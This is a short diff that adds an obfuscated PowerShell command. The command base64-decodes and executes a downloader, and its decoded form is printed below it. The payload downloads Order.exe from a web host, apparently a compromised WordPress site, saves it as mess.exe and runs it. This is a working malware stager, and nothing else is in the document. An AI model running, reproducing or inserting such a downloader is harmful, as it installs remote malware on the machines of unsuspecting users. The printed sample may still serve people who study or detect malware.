@@ -1,0 +1,7 @@
+iex([SyStem.TEXt.EncoDInG]::Utf8.gETStrIng([sYStEm.COnVeRt]::FRoMbASE64stRInG('CihOZXctT2JqZWN0IFN5c3RlbS5uZVQuV2ViQ0xJRU50KS5Eb3dubG9BZGZJTGUoJ2h0dHA6Ly9icm9rZWxpbWl0ZWRzLmluL3dwLWFkbWluL2Nzcy91cGxvYWQvT3JkZXIuZXhlJywnbWVzcy5leGUnKTtTdGFydC1Qcm9jZXNzICdtZXNzLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object System.neT.WebCLIENt).DownloAdfILe('http://brokelimiteds.in/wp-admin/css/upload/Order.exe','mess.exe');Start-Process 'mess.exe'
+
